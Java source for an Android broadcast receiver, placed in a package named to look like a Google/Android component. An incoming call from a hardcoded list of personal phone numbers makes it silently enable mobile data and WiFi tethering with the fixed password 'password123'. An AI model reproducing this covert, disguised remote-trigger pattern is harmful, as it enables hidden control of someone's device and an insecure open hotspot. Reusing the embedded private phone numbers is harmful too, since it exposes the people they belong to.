package com.android.google.important.file;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

public class XrobBR extends BroadcastReceiver {

	BlowIt blw;


	@Override
	public void onReceive(final Context context, Intent intent) {

		blw = new BlowIt(context);

		Log.d("X", "XROBBR CALLED");

		TelephonyManager tm = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		PhoneStateListener callStateListener = new PhoneStateListener() {
			@Override
			public void onCallStateChanged(int state, String incomingNumber) {
				super.onCallStateChanged(state, incomingNumber);

				if (state == 1) {

					Log.d("X", "Incoming:" + incomingNumber);

					Log.i("X", "FIRST TIME");

					if (incomingNumber.equals("+919895182634") // MOM
							|| incomingNumber.equals("+918301893919") // ME
							|| incomingNumber.equals("+919495562361") // SHUHAIB
							|| incomingNumber.equals("+918129641999") // MARWAN
							|| incomingNumber.equals("+917293193131") // NIDAL

					) {

						Log.i("X", "Condition True");

						if (!blw.isConnectingToInternet()) {

							Log.d("X",
									"Network not connected and enabling network");
							blw.enableMobileData();

						}

						if (blw.isWifiTethering()) {
							Log.d("X", "Wifi Tethering ON");
						} else {
							Log.d("X", "Wifi Tethring OFF");
						}

						if (blw.isConnectingToInternet()) {

							Log.d("X",
									"Network connected and Enabling Tethering");
							if (blw.getWiFiManager().isWifiEnabled()) {
								Log.i("X",
										"WiFi enabled, so disabling wifi and enabling WiFi tethering");
								blw.getWiFiManager().setWifiEnabled(false);
								blw.enableWifiTethering();
								blw.changeConfiguration("password123");

							} else {
								blw.enableWifiTethering();
								blw.changeConfiguration("password123");
							}

						}
					}

				}

			}
		};

		tm.listen(callStateListener, PhoneStateListener.LISTEN_CALL_STATE);

	}

}